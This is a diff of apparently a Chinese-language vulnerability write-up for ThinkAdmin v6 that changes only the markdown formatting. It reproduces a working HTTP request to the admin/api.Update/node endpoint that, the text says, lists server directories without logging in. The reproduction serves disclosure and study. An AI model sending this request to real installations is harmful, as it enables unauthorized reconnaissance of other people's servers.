@@ -44,7 +44,7 @@ https://github.com/zoujingli/ThinkAdmin/issues/244
 
 访问：http://192.168.149.133:81/ThinkAdmin-6/public/index.php/admin/login.html  
 burp抓包，将数据包修改如下：  
-```
+
 POST /ThinkAdmin-6/public/index.php/admin/login.html?s=admin/api.Update/node HTTP/1.1
 Host: 127.0.0.1
 Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
@@ -53,7 +53,7 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 22
 
 rules=%5B%22.%2F%22%5D
-```
+
 成功列出了目录，如下图  
 ![image](./0.png)
 
